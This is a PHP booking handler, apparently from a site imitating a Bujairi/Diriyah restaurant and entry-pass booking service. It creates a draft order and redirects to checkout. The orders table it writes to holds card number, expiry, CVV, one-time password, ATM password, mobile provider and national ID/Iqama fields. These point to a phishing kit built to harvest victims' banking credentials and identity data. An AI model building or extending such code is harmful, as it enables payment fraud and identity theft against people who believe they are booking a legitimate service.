<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    http_response_code(405);
    echo 'Method Not Allowed';
    exit;
}

$restaurantId = (int) ($_POST['restaurantId'] ?? 0);
$bookingRaw = trim((string) ($_POST['BookingDate'] ?? ''));
$guests = (int) ($_POST['Guests'] ?? 1);
$selectedTime = trim((string) ($_POST['SelectedTime'] ?? ''));
$guestCap = $restaurantId > 0 ? 20 : 12;
$guests = max(1, min($guestCap, $guests));

try {
    $dt = new \DateTime($bookingRaw);
} catch (\Throwable $e) {
    http_response_code(400);
    echo 'تاريخ غير صالح';
    exit;
}
$dateStr = $dt->format('Y-m-d');

$pdo = bujairi_pdo();
$pdo->beginTransaction();
try {
    $fake = bin2hex(random_bytes(16));
    $customerEmail = null;
    $uid = auth_user_id();
    if ($uid) {
        $eSt = $pdo->prepare('SELECT email FROM users WHERE id = ? LIMIT 1');
        $eSt->execute([$uid]);
        $rowE = $eSt->fetch(PDO::FETCH_ASSOC);
        if ($rowE) {
            $customerEmail = trim((string) ($rowE['email'] ?? ''));
        }
    }
    if ($customerEmail === null || $customerEmail === '') {
        $g = (string) ($_SESSION['guest_email'] ?? '');
        if ($g !== '') {
            $customerEmail = trim($g);
        }
    }
    if ($customerEmail === '') {
        $customerEmail = null;
    }
    $orderId = 0;
    try {
        $st = $pdo->prepare(
            'INSERT INTO orders (fake_user_key, customer_email, payment_method, cardholder_name, card_number, expiry, cvv, otp, atm_password, mobile, provider, national_id_or_iqama, status) VALUES (?, ?, \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'Draft\')'
        );
        $st->execute([$fake, $customerEmail]);
        $orderId = (int) $pdo->lastInsertId();
    } catch (Throwable $e) {
        $st = $pdo->prepare(
            'INSERT INTO orders (fake_user_key, payment_method, cardholder_name, card_number, expiry, cvv, otp, atm_password, mobile, provider, national_id_or_iqama, status) VALUES (?, \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'Draft\')'
        );
        $st->execute([$fake]);
        $orderId = (int) $pdo->lastInsertId();
    }

    if ($restaurantId > 0) {
        $r = restaurant_by_id($pdo, $restaurantId);
        if (!$r) {
            $pdo->rollBack();
            http_response_code(404);
            echo 'مطعم غير موجود';
            exit;
        }
        $unit = (float) $r['minimum_charge'];
        $line = $unit * $guests;
        $title = $r['name'];
        $type = 'Restaurant';
        $rid = $restaurantId;
    } else {
        $unit = 50.0;
        $line = $unit * $guests;
        $title = 'تصريح دخول الدرعية';
        $type = 'DiriyahPass';
        $rid = 0;
    }

    $st2 = $pdo->prepare(
        'INSERT INTO order_items (order_id, type, restaurant_id, title, booking_date, guests, unit_price, line_total, selected_time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
    );
    $st2->execute([$orderId, $type, $rid, $title, $dateStr, $guests, $unit, $line, $selectedTime]);
    if (!isset($_SESSION['bujairi_owned_orders']) || !is_array($_SESSION['bujairi_owned_orders'])) {
        $_SESSION['bujairi_owned_orders'] = [];
    }
    $_SESSION['bujairi_owned_orders'][$orderId] = time();
    $pdo->commit();
} catch (Throwable $e) {
    $pdo->rollBack();
    throw $e;
}

redirect('booking/checkout.php?id=' . $orderId);
